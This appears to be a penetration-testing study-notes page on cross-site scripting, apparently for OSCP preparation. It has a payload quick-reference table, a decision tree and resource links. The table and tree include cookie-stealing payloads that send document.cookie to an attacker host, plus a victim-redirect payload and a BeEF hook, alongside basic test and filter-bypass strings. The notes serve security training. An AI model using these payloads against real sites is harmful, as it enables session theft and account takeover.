# Cross-Site Scripting
%% moc %%
> [!abstract] Map of Content
> Theory → identify → basic payloads → privesc via XSS.
> 
> ⬆ Up: [[Web Applications/_index|Web Applications]]

## Notes
- [[Basic XSS]]
- [[Identifying XSS Vulnerabilities]]
- [[JavaScript Refresher]]
- [[Privilege Escalation via XSS]]
- [[Stored vs Reflected XSS Theory]]

## Related Sections
- [[Web Applications/Common Web Application Attacks/_index|Common Web Application Attacks]]
- [[Web Applications/_index|Web Applications]]

---

> [!tip] Quick Reference — XSS
> | Type | Payload |
> |------|---------|
> | Basic test | `<script>alert(1)</script>` |
> | Image onerror | `<img src=x onerror=alert(1)>` |
> | SVG | `<svg onload=alert(1)>` |
> | Cookie steal | `<script>document.location='http://<LHOST>/?c='+document.cookie</script>` |
> | Attribute inject | `" onmouseover="alert(1)` |
> | Filter bypass | `<ScRiPt>alert(1)</ScRiPt>` |
> | Cookie steal (fetch) | `<script>fetch('http://<LHOST>/?c='+document.cookie)</script>` |
> | Redirect victim | `<script>window.location='http://<LHOST>'</script>` |
> | BeEF hook | `<script src="http://<LHOST>:3000/hook.js"></script>` |

## Decision Tree

```
User input reflected in page?
├── Test basic: <script>alert(1)</script>
│   ├── Popup appears → Stored or Reflected XSS
│   └── No popup → check page source for output
│       ├── Output in attribute → " onmouseover="alert(1)
│       ├── Output in JS context → ';alert(1);//
│       └── Filtered → try alternatives (img, svg, uppercase, encoding)
│
├── Stored XSS (persists for other users)?
│   └── Higher impact — can target admin sessions
│       ├── Cookie theft (if no HttpOnly)
│       │   └── <script>fetch('http://<LHOST>/?c='+btoa(document.cookie))</script>
│       └── Admin action via CSRF + XSS
│           └── Craft JS to perform action as admin (create user, change password)
│
└── Reflected XSS?
    └── Needs victim to click URL — less useful for OSCP unless specifically required
```

## Resources
- [HackTricks — XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
- [PayloadsAllTheThings — XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [XSS Hunter](https://xsshunter.trufflesecurity.com) — blind XSS callbacks


One of the most important features of a well-defended web application is data sanitization, a process in which user input is processed so that all dangerous characters or strings are removed or transformed. Unsanitized data allows an attacker to inject, and potentially execute, malicious code.

Cross-Site Scripting (XSS) is a vulnerability that exploits a user's trust in a website by dynamically injecting content into the page rendered by the user's browser.
